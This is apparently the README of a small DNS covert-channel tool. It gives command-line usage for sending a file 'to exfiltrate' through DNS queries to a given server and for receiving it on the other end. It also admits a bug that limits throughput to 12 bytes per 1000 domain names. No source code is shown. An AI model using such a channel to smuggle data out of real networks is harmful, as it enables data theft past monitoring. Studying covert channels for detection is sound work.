# DNS-Covert-Channel
Due to an implementation bug this cover channel can only support
the transportation of 12 bytes per 1000 domain names.

Domain names are currently hardcoded in, no need to supply your own
## Use

### Sending
Proper syntax is ./main --fileIn <filepath> --dns <IP>
- filepath points to the file to exfiltrate
- IP is the DNS server to query

### Receiving
Proper syntax is ./main --fileOut <filepath> --dns <IP>
- filepath is the location to save the output
- IP is the DNS server to query